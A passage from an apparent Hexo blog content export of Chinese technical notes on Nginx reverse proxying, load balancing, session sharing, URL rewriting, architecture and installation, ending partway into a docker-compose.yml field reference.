192.168.43.144:10010&#x2F;console&#x2F;service&#x2F;1&#x2F;1&#x2F;get-sys-param-info</span><br></pre></td></tr></table></figure><h3 id="反向代理服务器"><a href="#反向代理服务器" class="headerlink" title="反向代理服务器"></a>反向代理服务器</h3><blockquote><p>反向代理就是当请求访问你的代理服务器时，代理服务器会对你的请求进行转发，可以转发到静态的资源路径上去，也可以转发到动态的服务接口上去。<br><a href="http://tengine.taobao.org/" target="_blank" rel="noopener">淘宝基于nginx改进的tengine</a></p></blockquote><h4 id="反向代理的作用"><a href="#反向代理的作用" class="headerlink" title="反向代理的作用"></a>反向代理的作用</h4><p>（1）保证内网的安全，通常将反向代理作为公网访问地址，Web服务器是内网。<br>（2）负载均衡，通过反向代理服务器来优化网站的负载。</p><h4 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h4><blockquote><p>将服务器接收到的请求按照规则分发的过程，称为负载均衡。</p></blockquote><h5 id="使用示例-1"><a href="#使用示例-1" class="headerlink" title="使用示例"></a>使用示例</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">首先在http下增加一个upstream ，用来指向各个服务器节点</span><br><span class="line">    upstream weixin_8111_8222&#123;</span><br><span class="line">          server127.0.0.1:8111 weight&#x3D;1;</span><br><span class="line">          serverxxxxxxxxx:8222 weight&#x3D;2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">然后修改：</span><br><span class="line">        location &#x2F; &#123;</span><br><span class="line">            proxy_pass http:&#x2F;&#x2F;weixin_8111_8222;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h5 id="Nginx支持的负载均衡调度算法"><a href="#Nginx支持的负载均衡调度算法" class="headerlink" title="Nginx支持的负载均衡调度算法"></a>Nginx支持的负载均衡调度算法</h5><ol><li>weight轮询(默认)：接收到的请求按照顺序逐一分配到不同的后端服务器，即使在使用过程中，某一台后端服务器宕机，Nginx会自动将该服务器剔除出队列，请求受理情况不会受到任何影响。这种方式下，可以给不同的后端服务器设置一个权重值(weight)，用于调整不同的服务器上请求的分配率；权重数据越大，被分配到请求的几率越大；该权重值，主要是针对实际工作环境中不同的后端服务器硬件配置进行调整的。</li><li>ip_hash：每个请求按照发起客户端的ip的hash结果进行匹配，这样的算法下一个固定ip地址的客户端总会访问到同一个后端服务器，这也在一定程度上解决了集群部署环境下session共享的问题。</li><li>fair：智能调整调度算法，动态的根据后端服务器的请求处理到响应的时间进行均衡分配，响应时间短处理效率高的服务器分配到请求的概率高，响应时间长处理效率低的服务器分配到的请求少；结合了前两者的优点的一种调度算法。但是需要注意的是Nginx默认不支持fair算法，如果要使用这种调度算法，请安装upstream_fair模块。</li><li>url_hash：按照访问的url的hash结果分配请求，每个请求的url会指向后端固定的某个服务器，可以在Nginx作为静态服务器的情况下提高缓存效率。同样要注意Nginx默认不支持这种调度算法，要使用的话需要安装Nginx的hash软件包。</li></ol><h5 id="session-问题"><a href="#session-问题" class="headerlink" title="session 问题"></a>session 问题</h5><p>通过负载均衡课程，我们可以把请求分发到不同的 Tomcat 来缓解服务器的压力，但是这里存在一个问题： 当同一个用户第一次访问tomcat_8111 并且登录成功， 而第二次访问却被分配到了tomcat_8222， 这里并没有记录他的登陆状态，那么就会呈现未登录状态了，严重伤害了用户体验。</p><ol><li>解决办法一: ip_hash<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 通过ip地址标记用户，如果多次请求都是从同一个ip来的，那么就都分配到同一个tomcat</span><br><span class="line">upstream weixin_8111_8222&#123;</span><br><span class="line">        server127.0.0.1:8111 backup;   # backup是指主节点全部宕机了才启用此节点</span><br><span class="line">        serverxxxxxxxxx:8222 weight&#x3D;2;</span><br><span class="line">        ip_hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>解决办法二： redis+tomcat-sessoin-manager<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Tomcat需要链接 redis，所以需要专门的jar包，一共有3个jar包：</span><br><span class="line">jedis-2.5.2.jar，</span><br><span class="line">commons-pool2-2.0.jar，</span><br><span class="line">tomcat-redis-session-manager1.2.jar。</span><br><span class="line">然后修改tomcat&#x2F;conf&#x2F;context.xml ，增加下面这坨东西</span><br><span class="line"></span><br><span class="line">&lt;Valve className&#x3D;&quot;com.orangefunction.tomcat.redissessions.RedisSessionHandlerValve&quot; &#x2F;&gt;</span><br><span class="line">&lt;Manager className&#x3D;&quot;com.orangefunction.tomcat.redissessions.RedisSessionManager&quot;</span><br><span class="line"> host&#x3D;&quot;127.0.0.1&quot;</span><br><span class="line"> port&#x3D;&quot;6379&quot;</span><br><span class="line"> database&#x3D;&quot;0&quot;</span><br><span class="line"> maxInactiveInterval&#x3D;&quot;60&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><h4 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"># 1. 首先修改下本机的host文件，例如：</span><br><span class="line">192.168.6.132 docs.macrozheng.com</span><br><span class="line">192.168.6.132 mall.macrozheng.com</span><br><span class="line"></span><br><span class="line"># 2. 在&#x2F;mydata&#x2F;nginx&#x2F;conf&#x2F;conf.d文件夹中添加配置文件docs.conf对文档项目进行反向代理：</span><br><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  docs.macrozheng.com; #修改域名</span><br><span class="line"></span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">        root   &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;docs; #代理到docs文件夹中</span><br><span class="line">        index  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    error_page   500 502 503 504  &#x2F;50x.html;</span><br><span class="line">    location &#x3D; &#x2F;50x.html &#123;</span><br><span class="line">        root   &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 3. 在&#x2F;mydata&#x2F;nginx&#x2F;conf&#x2F;conf.d文件夹中添加配置文件mall.conf对mall的前端项目进行反向代理：</span><br><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  mall.macrozheng.com; #修改域名</span><br><span class="line"></span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">        root   &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;mall; #代理到mall文件夹中</span><br><span class="line">        index  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    error_page   500 502 503 504  &#x2F;50x.html;</span><br><span class="line">    location &#x3D; &#x2F;50x.html &#123;</span><br><span class="line">        root   &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 重启nginx服务：</span><br><span class="line">docker restart nginx</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 一个server代理多个url</span><br><span class="line"></span><br><span class="line">location &#x2F; &#123;</span><br><span class="line">  root  &#x2F;home&#x2F;wwwroot&#x2F;graduation;</span><br><span class="line">  index index.html;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location &#x2F;mikutap &#123;</span><br><span class="line">  alias  &#x2F;home&#x2F;wwwroot&#x2F;mikutap&#x2F;;</span><br><span class="line">  index index.html;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location &#x2F;rpremoval &#123;</span><br><span class="line">  alias  &#x2F;home&#x2F;wwwroot&#x2F;realtime-person-removal&#x2F;;</span><br><span class="line">  index index.html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 1. 首先修改下本机的host文件，例如：</span><br><span class="line">192.168.6.132 api.macrozheng.com</span><br><span class="line"></span><br><span class="line"># 2. 在&#x2F;mydata&#x2F;nginx&#x2F;conf&#x2F;conf.d文件夹中添加配置文件api.conf对将请求代理到远程的mall-admin服务上去：</span><br><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  api.macrozheng.com; #修改域名</span><br><span class="line"></span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">    proxy_pass   http:&#x2F;&#x2F;120.27.63.9:8080; #修改为代理服务地址</span><br><span class="line">        index  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    error_page   500 502 503 504  &#x2F;50x.html;</span><br><span class="line">    location &#x3D; &#x2F;50x.html &#123;</span><br><span class="line">        root   &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="地址重写"><a href="#地址重写" class="headerlink" title="地址重写"></a>地址重写</h4>有的时候我们的网站更换了域名，但还有用户在使用老的域名访问，这时可以通过nginx的地址重写来让用户跳转到新的域名进行访问。</li></ol><p>比如说原来用的docs.macrozheng.com这个域名不用了，现在改成<a href="http://www.macrozheng.com了来访问文档项目了；修改docs.conf配置文件，将地址带参数重写到新地址：">www.macrozheng.com了来访问文档项目了；修改docs.conf配置文件，将地址带参数重写到新地址：</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  docs.macrozheng.com;</span><br><span class="line"></span><br><span class="line">    rewrite &quot;^&#x2F;(.*)$&quot; http:&#x2F;&#x2F;www.macrozheng.com&#x2F;$1; #地址重写到新地址</span><br><span class="line"></span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">        root   &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;docs;</span><br><span class="line">        index  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    error_page   500 502 503 504  &#x2F;50x.html;</span><br><span class="line">    location &#x3D; &#x2F;50x.html &#123;</span><br><span class="line">        root   &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="一个IP绑定多个域名"><a href="#一个IP绑定多个域名" class="headerlink" title="一个IP绑定多个域名"></a>一个IP绑定多个域名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">匹配顺序:</span><br><span class="line">server_name与host匹配优先级如下：</span><br><span class="line">1、完全匹配</span><br><span class="line">2、通配符在前的，如*.test.com</span><br><span class="line">3、在后的，如www.test.*</span><br><span class="line">4、正则匹配，如~^\.www\.test\.com$</span><br><span class="line"></span><br><span class="line">如果都不匹配:</span><br><span class="line">1、优先选择listen配置项后有default或default_server的</span><br><span class="line">2、找到匹配listen端口的第一个server块</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">listen 80;</span><br><span class="line">server_name www;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">listen  80;</span><br><span class="line">server_name www.zkh.com;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="反向代理修改url"><a href="#反向代理修改url" class="headerlink" title="反向代理修改url"></a>反向代理修改url</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">比如对外接口是 192.168.43.144:10050&#x2F;uuatest&#x2F;uivs&#x2F;1&#x2F;1&#x2F;user&#x2F;register</span><br><span class="line">服务实际接口是 192.168.43.144:10050&#x2F;UUA&#x2F;uivs&#x2F;1&#x2F;1&#x2F;user&#x2F;register</span><br><span class="line"></span><br><span class="line">&#x2F;uuatest&#x2F; ：uuatest 不传到后台服务</span><br><span class="line">&#x2F;uuatest  ：uuatest 传到后台服务</span><br><span class="line"></span><br><span class="line">则如下：</span><br><span class="line">server&#123;</span><br><span class="line">  listen 10050;</span><br><span class="line">  server_name 192.168.43.144;</span><br><span class="line">  location &#x2F;uuatest&#x2F; &#123;</span><br><span class="line">    proxy_pass http:&#x2F;&#x2F;uua_service_8081&#x2F;UUA&#x2F;;</span><br><span class="line">    proxy_set_header        X-Real-IP $remote_addr;</span><br><span class="line">    proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    proxy_set_header        Host $http_host;</span><br><span class="line">    proxy_set_header        urlprefix https;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="IMAP、POP3、SMTP代理服务器"><a href="#IMAP、POP3、SMTP代理服务器" class="headerlink" title="IMAP、POP3、SMTP代理服务器"></a>IMAP、POP3、SMTP代理服务器</h3>]]></content>
      
      
      <categories>
          
          <category> Basic Component </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Introduction of Nginx</title>
      <link href="/2019/10/03/Introduction-of-Nginx/"/>
      <url>/2019/10/03/Introduction-of-Nginx/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Nginx: Engine X</p></blockquote><h2 id="Web-服务器"><a href="#Web-服务器" class="headerlink" title="Web 服务器"></a>Web 服务器</h2><p>Nginx 与 Apache一样，是一种WEB服务器。是基于REST架构风格，以统一资源描述符(Uniform Resources Identifier)URI或者统一资源定位符(Uniform Resources Locator)URL作为沟通依据，通过HTTP协议提供各种网络服务。</p><p>不同于重量级且不支持高并发的Apache，Nginx具有如下特点：</p><ol><li>轻量级<blockquote><p>功能模块少 - Nginx仅保留了HTTP需要的模块，其他都用插件的方式，后天添加代码模块化 - 更适合二次开发，如阿里巴巴Tengine</p></blockquote></li><li>高并发<blockquote><p>使用基于事件驱动架构，使得其可以支持数以百万级别的TCP连接。</p></blockquote></li><li>CPU亲和<blockquote><p>把CPU核心和Nginx工作进程绑定，把每个worker进程固定在一个CPU上执行，减少切换CPU的cache miss，从而提高性能。</p></blockquote></li></ol><h2 id="Nginx-原理"><a href="#Nginx-原理" class="headerlink" title="Nginx 原理"></a>Nginx 原理</h2><h3 id="Nginx进程模型"><a href="#Nginx进程模型" class="headerlink" title="Nginx进程模型"></a>Nginx进程模型</h3><p><img src="Nginx%E8%BF%9B%E7%A8%8B%E6%A8%A1%E5%9E%8B.png" alt=""><br>Nginx 服务器，正常运行过程中：</p><ol><li>多进程：一个 Master 进程、多个 Worker 进程</li><li>Master 进程：管理 Worker 进程</li><li>对外接口：接收外部的操作（信号）</li><li>对内转发：根据外部的操作的不同，通过信号管理 Worker</li><li>监控：监控 worker 进程的运行状态，worker 进程异常终止后，自动重启 worker 进程</li><li>Worker 进程：所有 Worker 进程都是平等的</li><li>实际处理：网络请求，由 Worker 进程处理</li><li>Worker 进程数量：在 nginx.conf 中配置，一般设置为核心数，充分利用 CPU 资源，同时，避免进程数量过多，避免进程竞争 CPU 资源，增加上下文切换的损耗。</li></ol><h3 id="HTTP-连接建立和请求处理过程"><a href="#HTTP-连接建立和请求处理过程" class="headerlink" title="HTTP 连接建立和请求处理过程"></a>HTTP 连接建立和请求处理过程</h3><ol><li>Nginx 启动时，Master 进程，加载配置文件</li><li>Master 进程，初始化监听的 socket</li><li>Master 进程，fork 出多个 Worker 进程</li><li>Worker 进程，竞争新的连接，获胜方通过三次握手，建立 Socket 连接，并处理请求</li></ol><h3 id="高性能、高并发"><a href="#高性能、高并发" class="headerlink" title="高性能、高并发"></a>高性能、高并发</h3><blockquote><p>异步，非阻塞，使用了IO 多路复用 epoll 和大量的底层代码优化。<br>单个连接的请求处理速度没有优势，适合 IO 密集型 场景，事件驱动</p></blockquote><p>如果一个server采用一个进程负责一个request的方式，那么进程数就是并发数。正常情况下，会有很多进程一直在等待中。<br>而nginx采用一个master进程，多个woker进程的模式。<br>master进程主要负责收集、分发请求。每当一个请求过来时，master就拉起一个worker进程负责处理这个请求。<br>同时master进程也负责监控woker的状态，保证高可靠性。<br>woker进程一般设置为跟cpu核心数一致。nginx的woker进程在同一时间可以处理的请求数只受内存限制，可以处理多个请求。</p><p>Nginx 的异步非阻塞工作方式正把当中的等待时间利用起来了。在需要等待的时候，这些进程就空闲出来待命了，因此表现为少数几个进程就解决了大量的并发问题。</p><p>每进来一个request，会有一个worker进程去处理。但不是全程的处理，只处理到可能发生阻塞的地方，比如向上游(后端)服务器转发request，并等待请求返回。那么，这个处理的worker会在发送完请求后，注册一个事件：“如果upstream返回了，告诉我一声，我再接着干”。于是他就休息去了。此时，如果再有request 进来，他就可以很快再按这种方式处理。而一旦上游服务器返回了，就会触发这个事件，worker才会来接手，这个request才会接着往下走。</p><p>所以不同于Apache: 创建多个进程或线程，而每个进程或线程都会为其分配 cpu 和内存(线程要比进程小的多，所以worker支持比perfork高的并发)，并发过大会耗光服务器资源。</p><p>Nginx: 采用单线程来异步非阻塞处理请求(管理员可以配置Nginx主进程的工作进程的数量)(epoll)，不会为每个请求分配cpu和内存资源，节省了大量资源，同时也减少了大量的CPU的上下文切换。所以才使得Nginx支持更高的并发。</p><h3 id="Nginx事件处理模型"><a href="#Nginx事件处理模型" class="headerlink" title="Nginx事件处理模型"></a>Nginx事件处理模型</h3><p><img src="Nginx%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E6%A8%A1%E5%9E%8B.png" alt=""></p><h3 id="模块化体系结构"><a href="#模块化体系结构" class="headerlink" title="模块化体系结构"></a>模块化体系结构</h3><p><img src="Nginx%E6%A8%A1%E5%9D%97%E5%8C%96%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84.png" alt=""><br>nginx的模块根据其功能基本上可以分为以下几种类型：</p><h4 id="event-module"><a href="#event-module" class="headerlink" title="event module"></a>event module</h4><p>搭建了独立于操作系统的事件处理机制的框架，及提供了各具体事件的处理。包括ngx_events_module， ngx_event_core_module和ngx_epoll_module等。nginx具体使用何种事件处理模块，这依赖于具体的操作系统和编译选项。</p><h4 id="phase-handler"><a href="#phase-handler" class="headerlink" title="phase handler"></a>phase handler</h4><p>此类型的模块也被直接称为handler模块。主要负责处理客户端请求并产生待响应内容，比如ngx_http_static_module模块，负责客户端的静态页面请求处理并将对应的磁盘文件准备为响应内容输出。</p><h4 id="output-filter"><a href="#output-filter" class="headerlink" title="output filter"></a>output filter</h4><p>也称为filter模块，主要是负责对输出的内容进行处理，可以对输出进行修改。例如，可以实现对输出的所有html页面增加预定义的footbar一类的工作，或者对输出的图片的URL进行替换之类的工作。</p><h4 id="upstream"><a href="#upstream" class="headerlink" title="upstream"></a>upstream</h4><p>upstream模块实现反向代理的功能，将真正的请求转发到后端服务器上，并从后端服务器上读取响应，发回客户端。upstream模块是一种特殊的handler，只不过响应内容不是真正由自己产生的，而是从后端服务器上读取的。</p><h4 id="load-balancer"><a href="#load-balancer" class="headerlink" title="load-balancer"></a>load-balancer</h4><p>负载均衡模块，实现特定的算法，在众多的后端服务器中，选择一个服务器出来作为某个请求的转发服务器。</p><h2 id="Nginx-安装"><a href="#Nginx-安装" class="headerlink" title="Nginx 安装"></a>Nginx 安装</h2><h3 id="yum-安装"><a href="#yum-安装" class="headerlink" title="yum 安装"></a>yum 安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ yum install epel-release</span><br><span class="line">$ yum install nginx</span><br><span class="line"></span><br><span class="line">启停命令</span><br><span class="line">$ systemctl enable nginx</span><br><span class="line">$ systemctl start nginx</span><br><span class="line">$ systemctl restart nginx</span><br><span class="line">$ systemctl reload nginx</span><br><span class="line">浏览器访问IP确认是否开启成功</span><br><span class="line"></span><br><span class="line">配置文件默认位置</span><br><span class="line">&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</span><br></pre></td></tr></table></figure><h3 id="Docker-安装"><a href="#Docker-安装" class="headerlink" title="Docker 安装"></a>Docker 安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ docker pull nginx:1.10</span><br><span class="line"></span><br><span class="line">为了从容器中拷贝nginx配置，首先运行一次容器：</span><br><span class="line">docker run -p 80:80 --name nginx \</span><br><span class="line">-v &#x2F;mydata&#x2F;nginx&#x2F;html:&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html \</span><br><span class="line">-v &#x2F;mydata&#x2F;nginx&#x2F;logs:&#x2F;var&#x2F;log&#x2F;nginx  \</span><br><span class="line">-d nginx:1.10</span><br><span class="line"></span><br><span class="line">将容器内的配置文件拷贝到指定目录：</span><br><span class="line">docker container cp nginx:&#x2F;etc&#x2F;nginx &#x2F;mydata&#x2F;nginx&#x2F;</span><br><span class="line"></span><br><span class="line">修改文件名称：</span><br><span class="line">mv nginx conf</span><br><span class="line"></span><br><span class="line">终止并删除容器：</span><br><span class="line">docker stop nginx</span><br><span class="line">docker rm nginx</span><br><span class="line"></span><br><span class="line">使用docker命令启动</span><br><span class="line">docker run -p 80:80 --name nginx \</span><br><span class="line">-v &#x2F;mydata&#x2F;nginx&#x2F;html:&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html \</span><br><span class="line">-v &#x2F;mydata&#x2F;nginx&#x2F;logs:&#x2F;var&#x2F;log&#x2F;nginx  \</span><br><span class="line">-v &#x2F;mydata&#x2F;nginx&#x2F;conf:&#x2F;etc&#x2F;nginx \</span><br><span class="line">-d nginx:1.10</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Basic Component </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DockerCompose.yml</title>
      <link href="/2019/09/16/DockerCompose-yml/"/>
      <url>/2019/09/16/DockerCompose-yml/</url>
      
        <content type="html"><![CDATA[<h2 id="docker-compose-yml-模板文件属性"><a href="#docker-compose-yml-模板文件属性" class="headerlink" title="docker-compose.yml 模板文件属性"></a>docker-compose.yml 模板文件属性</h2><blockquote><p>默认的模板文件名称为 docker-compose.yml，格式为 YAML 格式。</p></blockquote><h6 id="version"><a href="#version" class="headerlink" title="version"></a>version</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">指定 docker-compose.yml 文件的写法格式</span><br></pre></td></tr></table></figure><h6 id="services"><a href="#services" class="headerlink" title="services"></a>services</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">多个容器集合</span><br></pre></td></tr></table></figure><h6 id="build"><a href="#build" class="headerlink" title="build"></a>build</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">配置构建时，Compose 会利用它自动构建镜像</span><br><span class="line">该值可以是一个路径，也可以是一个对象，用于指定 Dockerfile 参数</span><br><span class="line"></span><br><span class="line">build: .&#x2F;dir</span><br><span class="line">---------------</span><br><span class="line">build:</span><br><span class="line">    context: .&#x2F;dir</span><br><span class="line">    dockerfile: Dockerfile</span><br><span class="line">    args:</span><br><span class="line">        buildno: 1</span><br></pre></td></tr></table></figure><h6 id="command"><a href="#command" class="headerlink" title="command"></a>command</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">覆盖容器启动后默认执行的命令</span><br><span class="line">command: bundle exec thin -p 3000</span><br><span class="line">----------------------------------</span><br><span class="line">command: [bundle,exec,thin,-p,3000]</span><br></pre></td></tr></table></figure><h6 id="dns"><a href="#dns" class="headerlink" title="dns"></a>dns</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">配置 dns 服务器，可以是一个值或列表</span><br><span class="line">dns: 8.8.8.8</span><br><span class="line">------------</span><br><span class="line">dns:</span><br><span class="line">    - 8.8.8.8</span><br><span class="line">    - 9.9.9.9</span><br></pre></td></tr></table></figure><h6 id="dns-search"><a href="#dns-search" class="headerlink" title="dns_search"></a>dns_search</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">配置 DNS 搜索域，可以是一个值或列表</span><br><span class="line">dns_search: example.com</span><br><span class="line">------------------------</span><br><span class="line">dns_search:</span><br><span class="line">    - dc1.example.com</span><br><span class="line">    - dc2.example.com</span><br></pre></td></tr></table></figure><h6 id="environment"><a href="#environment" class="headerlink" title="environment"></a>environment</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">环境变量配置，可以用数组或字典两种方式</span><br><span class="line">environment:</span><br><span class="line">    RACK_ENV: development</span><br><span class="line">    SHOW: &#39;ture&#39;</span><br><span class="line">-------------------------</span><br><span 